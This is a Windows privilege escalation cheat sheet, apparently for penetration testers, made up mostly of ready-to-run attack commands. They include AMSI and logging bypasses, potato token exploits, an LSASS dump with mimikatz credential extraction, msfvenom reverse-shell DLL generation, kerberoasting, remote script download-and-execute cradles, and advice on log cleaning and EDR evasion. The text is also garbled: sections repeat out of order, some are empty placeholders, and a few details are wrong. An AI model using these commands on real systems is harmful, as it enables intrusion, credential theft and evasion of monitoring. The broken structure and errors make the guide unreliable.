# Windows Privilege Escalation Guide

<!-- Auto-generated TOC -->
[TOC]

## 1. Introduction and Methodology
### 1.1. Systematic Approach
## 11. Advanced Topics

### 11.1. Custom Exploit Development
When developing custom exploits for Windows privilege escalation, focus on these key areas:

1. Service Exploitation:
   - Analyze service binary behavior
   - Identify DLL loading patterns
   - Study process creation and token inheritance
   - Implement proper error handling
   - Consider SYSTEM privilege maintenance

2. Memory Manipulation:
   - Token duplication techniques
   - Process injection methods
   - Handle inheritance exploitation
   - Security descriptor modification

### 11.2. Advanced Token Manipulation
Token manipulation techniques beyond basic impersonation:

```powershell
# Using PowerSploit
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Token Duplication Process
# 1. Find SYSTEM process
# 2. Open handle to process
# 3. Duplicate token
# 4. Create process with token
```

### 11.3. Kernel Mode Exploits
Considerations for kernel exploitation:

1. System Analysis:
   - Kernel version identification
   - Patch level verification
   - Driver enumeration
   - Memory protection status

2. Exploitation Framework:
   - DKOM techniques
   - System call hooking
   - Driver loading mechanisms
   - Token manipulation at kernel level

### 11.4. Advanced Persistence Techniques
Methods for maintaining elevated access:

1. Service Installation:
   - Native Windows services
   - Kernel drivers
   - DLL persistence
   - WMI event subscription

2. Registry Manipulation:
   - Boot execution
   - AppInit_DLLs
   - Service parameters
   - COM hijacking

### 11.5. EDR Evasion
Techniques for avoiding detection:

1. Process Creation:
   - Parent PID spoofing
   - Token manipulation
   - Alternative execution paths
   - Memory resident execution

2. File Operations:
   - Alternate data streams
   - Timestomping
   - File-less persistence
   - Living off the land binaries

## 12. Appendices

### 12.1. Windows Version Specific Attacks

Windows version-specific privilege escalation techniques:

1. Windows Server 2016/2019:
   - PrintSpoofer exploitation
   - SeImpersonatePrivilege attacks
   - JuicyPotato variants
   - Service-specific vulnerabilities

2. Windows 10:
   - UAC bypass techniques
   - AppLocker bypass methods
   - PowerShell restrictions evasion
   - Modern exploit protections bypass

### 12.2. Common CVE Reference
Critical Windows privilege escalation CVEs:

1. Recent Critical Vulnerabilities:
   - PrintNightmare (CVE-2021-1675)
   - HiveNightmare (CVE-2021-36934)
   - PetitPotam (CVE-2021-36942)
   - RemotePotato0 (CVE-2021-1675)

2. Historical Important CVEs:
   - EternalBlue (MS17-010)
   - MS14-068
   - MS15-051
   - MS16-032

### 12.3. Tool Installation Guide
Installation and setup instructions for common tools:

1. PowerShell Tools:
   - PowerSploit
   - PowerUp
   - PowerView
   - SessionGopher

2. Binary Tools:
   - Mimikatz
   - ProcDump
   - BloodHound
   - Rubeus

### 12.4. PowerShell Security Bypass Methods
Methods for bypassing PowerShell security controls:

```powershell
# Execution Policy Bypass
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Script Block Logging Bypass
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging",0)
```

### 12.5. Common Exploits and Their Requirements
Exploitation prerequisites and requirements:

1. Service-Based Exploits:
   - Unquoted Service Paths:
     * Write permissions to service path
     * Service restart capability
   - Weak Service Permissions:
     * SERVICE_CHANGE_CONFIG access
     * Service restart capability

2. Token-Based Exploits:
   - PrintSpoofer:
     * SeImpersonatePrivilege
     * Windows Server 2016+
   - JuicyPotato:
     * SeImpersonatePrivilege
     * Specific Windows versions

3. Registry-Based Exploits:
   - AlwaysInstallElevated:
     * Both HKLM and HKCU registry keys enabled
     * Write permissions to Windows Installer directory
   - AutoRun:
     * Write permissions to AutoRun locations
     * User logon trigger

4. File-Based Exploits:
   - DLL Hijacking:
     * Write permissions to application directories
     * Application restart capability
   - Binary Replacement:
     * Write permissions to binary location
     * Service/application restart capability

### 1.2. Quick Wins vs Deep Enumeration
### 1.3. Command Line and PowerShell Usage
PowerShell provides extensive capabilities for system enumeration and privilege escalation. Understanding proper usage of both command-line tools and PowerShell is essential for effective privilege escalation attempts. When operating in PowerShell, always check the execution policy and language mode first, as these can restrict available capabilities.

Key considerations for PowerShell usage include understanding the difference between running commands in an elevated vs. non-elevated context, properly handling credentials and secure strings, and leveraging .NET framework capabilities when native PowerShell cmdlets are restricted.

### 1.4. Environmental Preparation
Before beginning privilege escalation attempts, prepare the environment by validating access levels, checking security controls, and ensuring proper tool availability. Assess PowerShell restrictions, AppLocker policies, and Windows Defender status. Identify writable directories for tool storage and execution.

Document the initial access vector and maintain awareness of the original entry point, as this often provides valuable context for privilege escalation opportunities. Establish persistent access if possible, and ensure all actions align with the engagement's scope and objectives.

### 3.4.1. Weak Permissions
File system permissions often provide opportunities for privilege escalation. Examine permissions on service executables, scheduled task scripts, and program directories. Pay special attention to permissions that allow modification of binaries or scripts executed by privileged accounts.

Critical locations to check include:
- Service executable paths
- Scheduled task directories
- Program Files directories
- System32 and related folders
- User home directories
- Custom application directories

### 4.7. Cached Credentials
Windows caches various types of credentials that can be leveraged for privilege escalation. Examine Windows Credential Manager, stored RDP connections, and cached domain logons. PowerShell command history and configuration files often contain credentials or connection strings.

Group Policy Preferences historically stored encrypted credentials that could be decrypted. While this specific vector has been patched, similar misconfigurations may exist in enterprise environments.

### 6.3. Group Policy
Group Policy Objects (GPOs) can be leveraged for privilege escalation when misconfigured. Examine GPO permissions, script execution policies, and startup scripts. Look for policies that deploy software or execute scripts with elevated privileges.

Pay particular attention to:
- Startup scripts and programs
- Security settings
- Administrative template configurations
- Software deployment policies
- User rights assignments

### 6.4. Trust Relationships
Domain trusts expand the potential attack surface for privilege escalation. Analyze both direct and transitive trusts between domains. Identify trust configurations that might allow privilege escalation across domain boundaries.

Consider scenarios such as:
- Parent-child relationships
- Cross-forest trusts
- External trusts
- Shortcut trusts
- Resource forest configurations

### 7.4. Network Service Exposure
Network services can provide additional attack surface for privilege escalation. Examine exposed services, their configurations, and associated privileges. Consider both standard Windows services and third-party applications.

Key areas to investigate include:
- Remote management interfaces
- Custom application services
- Database connections
- Authentication services
- Network file shares

### 8.3. Custom Scripts
Developing custom scripts enhances privilege escalation capabilities. Create modular tools that can be easily modified for specific environments. Implement proper error handling and logging to maintain operational security.

Script development should focus on:
- System enumeration automation
- Vulnerability identification
- Exploit automation
- Data exfiltration
- Persistence mechanisms

### 8.4. Tool Selection Strategy
Choose tools based on the target environment's restrictions and security controls. Consider factors such as EDR presence, application whitelisting, and PowerShell constraints. Maintain multiple options for each attack vector to ensure operational flexibility.

### 9.3. Recovery Options
Windows recovery options can sometimes be leveraged for privilege escalation. Examine access to recovery consoles, startup repair, and system restore points. Consider scenarios where boot options might provide elevated access.

### 9.4. Event Logs
Event logs provide valuable information for privilege escalation and need to be carefully managed during operations. Monitor logs for signs of detection and clean relevant entries when necessary. Understand which actions generate suspicious events and plan accordingly.

### 10.1. General Guidelines
Successful privilege escalation requires methodical enumeration and careful actions selection. Maintain situational awareness and document all findings. Test commands and tools in a lab environment when possible to understand their signatures and potential impact.

### 10.4. Common Misconfigurations
Windows systems frequently contain misconfigurations that enable privilege escalation. Common issues include:
- Unquoted service paths
- Weak service permissions
- Excessive user privileges
- Insecure file permissions
- Registry vulnerabilities
- Credential exposure
- Outdated software versions
- Misconfigured trust relationships

### 10.6. Evasion Techniques
Privilege escalation activities often require evading security controls. Consider techniques such as:
- Alternative execution paths
- Memory-only payloads
- Built-in Windows tools
- Indirect command execution
- Token manipulation
- Process injection methods
- DLL search order abuse

### 11.1. Custom Exploit Development
Creating custom exploits requires understanding Windows internals and security mechanisms. Focus on:
- Windows API usage
- Memory management
- Process manipulation
- Token operations
- Service interactions
- Registry operations

### 11.2. Advanced Token Manipulation
Token manipulation provides powerful privilege escalation capabilities. Understand:
- Token privilege types
- Access token structure
- Impersonation levels
- Token duplication
- Process tokens
- Session tokens

### 11.3. Kernel Mode Exploits
Kernel exploitation requires careful testing and validation. Consider:
- Driver vulnerabilities
- Memory operations
- System callbacks
- Object manipulation
- API hooking
- Patch protection

### 11.4. Advanced Persistence Techniques
Maintaining access after privilege escalation requires reliable persistence mechanisms. Implement:
- Service installation
- Registry modifications
- Scheduled tasks
- DLL hijacking
- WMI events
- COM hijacking

### 11.5. EDR Evasion
Modern environments often include endpoint detection and response (EDR) solutions. Consider:
- Direct system calls
- API unhooking
- Memory manipulation
- Alternative execution
- Process ghosting
- DLL unlinking

### 12.1. Windows Version Specific Attacks
Different Windows versions have unique privilege escalation opportunities. Consider:
- Version-specific vulnerabilities
- Feature differences
- Security control variations
- Default configurations
- Available tools
- Common misconfigurations

### 12.2. Common CVE Reference
Critical CVEs for privilege escalation vary by Windows version. Keep track of:
- Recent vulnerabilities
- Patch status
- Exploit requirements
- Detection methods
- Mitigation options

### 12.3. Tool Installation Guide
Properly installing and configuring tools is essential. Document:
- Dependencies
- Installation steps
- Configuration options
- Common issues
- Version compatibility

### 12.4. PowerShell Security Bypass Methods
PowerShell restrictions often require bypass techniques. Consider:
- Execution policy bypass
- AMSI bypass
- Logging bypass
- AppLocker bypass
- Constrained language bypass

### 12.5. Common Exploits and Their Requirements
Each exploit has specific requirements and considerations:
- Operating system versions
- Patch levels
- Required privileges
- Environmental conditions
- Dependencies
- Reliability factors

### 1.3. Command Line and PowerShell Usage
PowerShell environment settings and best practices for command-line operations:

Color settings for better readability:
```powershell
Set-PSReadLineOption -Colors @{
    Command = "Yellow"
    Operator = "Cyan"
    Parameter = "Green"
    String = "Magenta"
    Variable = "White"
    Type = "Blue"
    Number = "DarkCyan"
}
```

### 1.4. Environmental Preparation
Important PowerShell configurations:
```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
$ExecutionContext.SessionState.LanguageMode
```

## 2. Initial Enumeration

### 2.1. Operating System Information
```powershell
systeminfo                    # OS version, build info, memory, patch details, architecture
[environment]::Is64BitOperatingSystem    # Check if OS is 64-bit
[environment]::Is64BitProcess            # Check if process is 64-bit
[System.Environment]::OSVersion.Version  # OS version
wmic qfe get Caption,Description,HotFixID,InstalledOn    # List hotfixes
Get-HotFix                              # PowerShell updates list
```

### 2.2. User Context and Privileges
```powershell
whoami                          # Current user
whoami /groups                  # Current user, groups, privileges
whoami /priv                    # List privileges
hostname                        # Local computer name
echo %username%                 # Current user
echo %userdomain%              # Domain name
net user                        # List local users
net user [username]             # Details about specific user
net user /domain               # List domain users
net localgroup                 # List local groups
net localgroup administrators  # List users in Administrators group
```

### 2.3. Network Configuration
```powershell
ipconfig /all           # Network adapter settings
ipconfig /displaydns    # View DNS cache
arp -a                 # ARP table
route print            # Routing table
netstat -ano           # Open connections
netstat -ano | findstr LISTENING    # Filter listening ports
netsh advfirewall show allprofiles  # Current firewall profiles/config
```

### 2.4. Service and Process Analysis
```powershell
Get-Process                    # Lists running processes
tasklist                      # Lists running processes
tasklist /svc                 # Lists processes with services
net start                     # List running services
sc query state= all          # Detailed service info
wmic process get name,executablepath,commandline    # Process command lines

# Important Windows Processes
# smss.exe - Session Manager Subsystem
# csrss.exe - Client Server Runtime Subsystem
# winlogon.exe - WinLogon
# LSASS - Local Security Authority Subsystem Service
# svchost.exe - Service Host
```


### 2.5. Registry Enumeration
```powershell
reg query HKCU\Software /s /f "PuTTY"    # Search for PuTTY keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s    # PuTTY sessions
Get-ItemProperty -Path 'HKCU:\Software' -Name '*PuTTY*' -ErrorAction SilentlyContinue    # PuTTY items
Get-Acl "HKLM:\System\CurrentControlSet\Services\regsvc" | Format-List    # Service ACL

# Registry Searches
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | 
    Get-ItemProperty | Select-Object PSPath, PSChildName |
    Where-Object {$_.PSChildName -match "password"}
```

### 2.6. Scheduled Tasks
```powershell
schtasks /query /fo LIST /v    # List scheduled tasks

# Task monitoring script
$logFile = "C:\Users\Documents\scheduled_tasks_watch.txt"
while ($true) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Get-ScheduledTask | Where-Object {$_.State -eq 'Running'} | ForEach-Object {
        "$timestamp - TaskName: $($_.TaskName), State: $($_.State)" | Tee-Object -FilePath $logFile -Append
    }
    Start-Sleep -Seconds 2
}
```

### 2.7. Updates and Patches
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn    # List hotfixes
Get-HotFix    # PowerShell updates list
[System.Environment]::OSVersion.Version    # OS version
```

## 3. Core Attack Vectors

### 3.1. Service-Based Attacks

#### 3.1.1. Unquoted Service Paths
```powershell
wmic service get name,pathname    # List service paths
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *    # Check service permissions
```

#### 3.1.2. Weak Service Permissions
```powershell
sc qc <service>    # Query service configuration
sc config <service> binpath="C:\path\evil.exe"    # Modify service binary path
```

#### 3.1.3. DLL Hijacking
```powershell
# Monitor DLL loading with Procmon
procmon.exe /accepteula
msfvenom -p windows/x64/shell_reverse_tcp -f dll    # Generate malicious DLL
```

#### 3.1.4. Service Binary Manipulation
## 11. Advanced Topics

### 11.1. Custom Exploit Development
Custom exploit development for Windows privilege escalation requires deep understanding of Windows internals and security mechanisms. The process begins with thorough research of the target vulnerability, including analysis of Windows API functions, memory management, and process interactions. Development should focus on creating reliable, targeted exploits that minimize system impact and avoid detection.

When developing custom exploits, attention must be paid to platform-specific details such as memory protection mechanisms, ASLR implementation, and system call handling. Code execution techniques should be carefully chosen based on the target environment's security controls. Understanding of assembly language and debugging tools is essential for reliable exploit development.

### 11.2. Advanced Token Manipulation
Token manipulation provides sophisticated methods for privilege escalation through careful manipulation of Windows security tokens. This involves understanding the Windows security model, including access token structure, privilege attributes, and impersonation levels. Advanced techniques include token duplication, privilege escalation through impersonation, and manipulation of token integrity levels.

Successful token manipulation requires knowledge of process token inheritance, session tokens, and primary tokens. Implementation involves careful handling of system calls and proper management of token privileges. Understanding of Windows security descriptors and access control mechanisms is crucial for effective token manipulation.

### 11.3. Kernel Mode Exploits
Kernel mode exploitation represents a complex but powerful avenue for privilege escalation. This approach requires comprehensive understanding of Windows kernel architecture, driver interactions, and system call mechanisms. Development of kernel exploits involves careful manipulation of kernel-mode structures and proper handling of kernel-mode transitions.

Successful kernel exploitation requires knowledge of Windows memory management, including paging mechanisms and kernel memory pools. Understanding of kernel-mode callbacks, object management, and driver loading is essential. Proper testing and validation procedures must be implemented to avoid system instability.

### 11.4. Advanced Persistence Techniques
Advanced persistence methods ensure maintained access after successful privilege escalation. This involves implementing sophisticated mechanisms that survive system reboots and resist detection. Techniques include manipulation of Windows service architecture, registry modifications, and strategic placement of persistence components throughout the system.

Implementation requires understanding of Windows startup processes, service control mechanisms, and task scheduling. Advanced persistence often involves combining multiple techniques to ensure redundancy and reliability. Careful consideration must be given to operational security and minimizing detection signatures.

### 11.5. EDR Evasion
Modern EDR solutions present significant challenges for privilege escalation operations. Successful evasion requires understanding of EDR detection mechanisms, hook implementation, and monitoring capabilities. Advanced techniques include direct system calls, API unhooking, and sophisticated process injection methods.

Implementation involves careful manipulation of process memory, understanding of EDR hooking mechanisms, and proper handling of execution flows. Knowledge of common EDR monitoring points and detection signatures is essential. Techniques must be adapted to specific EDR solutions while maintaining operational reliability.

## 12. Appendices

### 12.1. Windows Version Specific Attacks
Each Windows version presents unique opportunities and challenges for privilege escalation. Windows Server environments often differ significantly from workstation environments in terms of available services and security configurations. Understanding version-specific differences in security implementation, available features, and common misconfigurations is crucial for successful privilege escalation.

Considerations include changes in service implementations, security feature availability, and default configurations across different Windows versions. Attack techniques must be adapted to specific target environments while accounting for version-specific security mechanisms.

### 12.2. Common CVE Reference
Critical vulnerabilities in Windows systems often provide reliable privilege escalation vectors. This section provides detailed analysis of significant CVEs affecting Windows privilege models. Understanding includes vulnerability mechanisms, required conditions, and exploitation techniques.

Each CVE entry includes detailed information about affected versions, patch status, and exploitation requirements. Consideration is given to detection signatures and potential mitigations. Regular updates to this reference ensure current knowledge of available attack vectors.

### 12.3. Tool Installation Guide
Proper tool installation and configuration is crucial for successful privilege escalation operations. This guide provides comprehensive setup instructions for essential tools, including required dependencies, configuration options, and environment preparation. Understanding includes proper tool placement, execution requirements, and operational security considerations.

Installation procedures account for different operating environments and security controls. Configuration options are tailored to specific operational requirements while maintaining tool reliability and effectiveness.

### 12.4. PowerShell Security Bypass Methods
PowerShell security mechanisms often require sophisticated bypass techniques for successful privilege escalation. This section covers advanced methods for bypassing execution policies, AMSI protection, and logging mechanisms. Implementation includes script block logging bypass, constrained language mode evasion, and anti-malware integration circumvention.

Bypass techniques must account for different PowerShell versions and security configurations. Understanding includes PowerShell security architecture, protection mechanisms, and logging implementations. Methods are adapted to specific environmental restrictions while maintaining operational reliability.

### 12.5. Common Exploits and Their Requirements
Successful exploitation requires thorough understanding of exploit requirements and environmental conditions. This section provides detailed analysis of common privilege escalation exploits, including specific version requirements, necessary privileges, and environmental dependencies. Understanding includes reliability factors, potential complications, and success indicators.

Each exploit entry includes detailed preparation requirements, execution procedures, and validation methods. Consideration is given to operational security and potential system impact. Regular updates ensure current knowledge of exploit effectiveness and reliability.

### 3.2. Registry-Based Attacks

#### 3.2.1. AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer    # Check registry settings
msiexec /quiet /qn /i evil.msi    # Install with elevation
```

#### 3.2.2. AutoRun Entries
[Content here]

#### 3.2.3. Service Configurations
[Content here]

### 3.3. Token-Based Attacks

#### 3.3.1. Token Privileges
```powershell
# Critical Privileges
SeImpersonatePrivilege        # Use with JuicyPotato, PrintSpoofer
SeAssignPrimaryPrivilege      # Similar to SeImpersonate
SeBackupPrivilege            # Read access to all files
SeRestorePrivilege           # Write access to all objects
SeCreateTokenPrivilege       # Create arbitrary tokens
SeLoadDriverPrivilege        # Load kernel drivers
SeTakeOwnershipPrivilege    # Take ownership of objects
SeDebugPrivilege            # Access other processes
SeTcbPrivilege             # Act as part of OS
```

#### 3.3.2. Token Manipulation
```powershell
# Using Mimikatz
privilege::debug
token::elevate /domainadmin

# Using Incognito
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Potato Attacks
PrintSpoofer64.exe -i -c cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999
```

#### 3.3.3. Named Pipe Impersonation
```powershell
# Create named pipe
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("pipe")
$pipe.WaitForConnection()

# Get client token
$token = $pipe.GetImpersonationUserToken()
```

### 3.4. File System Attacks

#### 3.4.1. Weak Permissions
```powershell
# Find sensitive files
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk -File -Recurse -ErrorAction SilentlyContinue    # KeePass and PuTTY keys
Get-ChildItem -Path C:\ -Filter "unattended.xml" -File -Recurse    # Unattend files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse    # XAMPP configs
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse    # User files
```

#### 3.4.2. Startup Folders
```powershell
wmic startup get caption,command    # List startup programs
Get-CimInstance Win32_StartupCommand    # PowerShell startup programs
```

#### 3.4.3. Binary Hijacking
[Content here]

## 4. Credential Hunting

### 4.1. Memory Extraction
```powershell
# Create LSASS Dump
.\procdump.exe -ma lsass.exe lsass.dmp
# Use Mimikatz offline
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"
```

### 4.2. Registry Locations
```powershell
# Common Registry Locations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
```

### 4.3. Configuration Files
```powershell
# Web Configuration
Get-ChildItem -Path C:\inetpub -Include web.config -File -Recurse
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse

# Unattended Installation Files
Get-ChildItem -Path C:\ -Include Unattend.xml,UnattendedSetup.xml -File -Recurse
```

### 4.4. Service Accounts
```powershell
wmic service get name,startname    # List service accounts
Get-WmiObject win32_service | Select-Object Name, StartName    # PowerShell alternative
```

### 4.5. PowerShell History
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt    # Command history
(Get-PSReadlineOption).HistorySavePath    # History file path
type((Get-PSReadlineOption).HistorySavePath)    # Display history
Get-History    # View command history
```

### 4.6. Browser Data
```powershell
.\lazagne.exe browsers    # Extract browser credentials
```

### 4.7. Cached Credentials
```powershell
cmdkey /list    # List stored credentials
runas /savecred /user:admin C:\PrivEsc\reverse.exe    # Use stored credentials
```

## 5. System Vulnerabilities

### 5.1. Missing Patches
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn    # List installed patches
systeminfo    # System information including patch level
```

### 5.2. Kernel Exploits
```powershell
# Watson commands
.\Watson.exe    # Find missing KBs and suggest exploits

# WES-NG
systeminfo > systeminfo.txt
wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only
```

### 5.3. Known CVEs
Common Windows privilege escalation CVEs to check:

1. Recent CVEs:
- PrintNightmare (CVE-2021-1675)
- HiveNightmare (CVE-2021-36934)
- PetitPotam (CVE-2021-36942)

2. Historical CVEs:
- EternalBlue (MS17-010)
- MS14-068 (Kerberos Elevation)
- MS15-051 (Win32k)
- MS16-032 (Secondary Logon)

### 5.4. Driver Vulnerabilities
Driver-based privilege escalation vectors:

1. Vulnerable Driver Loading:
- Check for unsigned drivers
- Examine driver load permissions
- Monitor driver installation events

2. Known Vulnerable Drivers:
- Review installed drivers
- Check driver versions
- Examine driver file permissions

### 5.5. WSL Weaknesses
Windows Subsystem for Linux attack surface:

1. Configuration Issues:
- Default user permissions
- Network configuration
- File system access

2. Integration Points:
- Windows-Linux interaction
- Shared resources
- Network interfaces

## 6. Active Directory Integration

### 6.1. Domain Enumeration
```powershell
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Set-Content adusers.txt    # List domain users
Get-Content .\adusers.txt | select -First 10    # View first 10 users
Get-ADUser -Filter * -Property DisplayName | Select-Object DisplayName    # Alt domain users
Get-NetDomain    # Domain info
Get-NetDomainController    # DC info
Get-DomainUser -SPN    # Users with SPNs
```

### 6.2. Kerberos Attacks
```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe asreproast /format:hashcat

# Impacket Tools
python3 GetUserSPNs.py domain/user:pass@target -request
python3 secretsdump.py domain/user:pass@target
```

### 6.3. Group Policy
[Content here]

### 6.4. Trust Relationships
```powershell
nltest /domain_trusts    # List domain trusts
```

### 6.5. LAPS
```powershell
Get-LAPSPasswords
python3 getLAPSPassword.py -u user -p pass -d domain
```

## 7. File Transfer and Network Techniques

### 7.1. File Transfer Methods
```powershell
# PowerShell Downloads
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename")

# PowerShell Script Execution in Memory
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

# Non-interactive FTP
echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# CertUtil
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```

### 7.2. Port Forwarding
```powershell
# Using plink.exe
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS

# Using SSH (Windows 10 1803+)
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

### 7.3. Tunneling
Network tunneling techniques:

1. Protocol Tunneling:
- HTTP tunneling
- DNS tunneling
- ICMP tunneling
- SMB tunneling

2. Implementation Methods:
- Custom proxy chains
- SOCKS proxies
- Remote port forwarding
- Dynamic port forwarding

### 7.4. Network Service Exposure
Network service analysis and exploitation:

1. Service Discovery:
- Port scanning techniques
- Service enumeration
- Protocol analysis
- Banner grabbing

2. Exposure Analysis:
- Access control review
- Authentication methods
- Protocol vulnerabilities
- Service configurations

## 8. Automation Tools

### 8.1. Enumeration Tools
```powershell
# Seatbelt
.\Seatbelt.exe all
.\Seatbelt.exe -group=all -full > output.txt
.\Seatbelt.exe NonStandardServices

# WinPEAS
winPeas.exe userinfo
winPeas.exe systeminfo
winPeas.exe processesinfo
winPeas.exe servicesinfo
winPeas.exe applicationsinfo
winPeas.exe networkinfo
winPeas.exe windowscreds
winPeas.exe browserinfo

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ServiceUnquoted
Get-ServiceFilePermission
Get-ModifiableService
```

### 8.2. Exploitation Tools
```powershell
# BloodHound/SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# LaZagne
.\LaZagne.exe all

# SessionGopher
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -AllDomain
```

### 8.3. Custom Scripts
Development guidelines for custom privilege escalation scripts:

1. Script Components:
- System enumeration functions
- Vulnerability detection
- Exploit automation
- Reporting mechanisms

2. Best Practices:
- Error handling
- Logging capabilities
- Modular design
- Clean-up procedures

### 8.4. Tool Selection Strategy
Framework for choosing appropriate tools:

1. Environment Considerations:
- Target OS version
- Security controls
- Network restrictions
- Available resources

2. Tool Characteristics:
- Detection footprint
- Success reliability
- Resource requirements
- Ease of use

## 9. System Management

### 9.1. Service Management
```powershell
# Service control commands
net start    # List running services
sc query state= all    # Detailed service info
sc config <service> binpath= "C:\path\to\executable"    # Modify service binary path
```

### 9.2. System Control
```powershell
shutdown /r /t 0    # Immediate restart
shutdown /s /t 0    # Immediate shutdown
shutdown /r /f /t 0    # Force restart
shutdown /s /f /t 0    # Force shutdown
Restart-Computer -Force    # PowerShell restart
Stop-Computer -Force    # PowerShell shutdown
```

### 9.3. Recovery Options
System recovery considerations:

1. Recovery Methods:
- Safe mode boot
- Recovery console
- System restore points
- Emergency repair

2. Recovery Tools:
- Windows RE
- Boot repair
- Configuration backup
- System file checker

### 9.4. Event Logs
Event log analysis and manipulation:

1. Log Categories:
- Security events
- System events
- Application events
- PowerShell logs

2. Log Analysis:
- Event correlation
- Pattern identification
- Timeline analysis
- Anomaly detection

## 10. Best Practices and Notes

### 10.1. General Guidelines
- Check C:\Windows\Temp - often writable by BUILTIN\Users and safe for uploading files
- When stuck, consider running SharpHound or pivoting back to initial access vector
- Groups can belong to other groups - check group nesting
- To escalate from admin user to SYSTEM, use PsExec
- Disabled status in whoami /priv output is irrelevant - focus on privilege presence

### 10.2. Quick Wins Checklist
Essential checks for rapid privilege escalation:

1. Service Checks:
- Unquoted service paths
- Weak service permissions
- Modifiable binaries
- DLL hijacking opportunities

2. Registry Checks:
- AlwaysInstallElevated
- AutoRun entries
- Stored credentials
- Default passwords

3. File System Checks:
- Writable program directories
- Accessible configuration files
- Backup files
- Sensitive data exposure

4. Token Privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeBackupPrivilege
- SeRestorePrivilege

### 10.3. Important File Locations
```powershell
# Common locations to check
C:\Windows\System32\config    # SAM and SYSTEM files
C:\Windows\repair    # Backup SAM and SYSTEM files
C:\Windows\debug\NetSetup.log    # Domain join information
C:\Windows\NTDS\NTDS.dit    # Active Directory database
C:\inetpub\    # IIS web server files
C:\xampp\    # XAMPP files
```

### 10.4. Common Misconfigurations
- Unquoted service paths
- Weak service permissions
- Missing patches
- Weak file permissions
- Misconfigured registry settings
- AlwaysInstallElevated enabled
- Cached credentials
- Weak scheduled task permissions

### 10.5. Command Reference
```powershell
# Essential commands for quick enumeration
systeminfo    # System information
whoami /all    # User context and privileges
net user    # Local users
ipconfig /all    # Network configuration
netstat -ano    # Network connections
tasklist /svc    # Running services
schtasks /query /fo LIST /v    # Scheduled tasks
```

### 10.6. Evasion Techniques
[Content here]

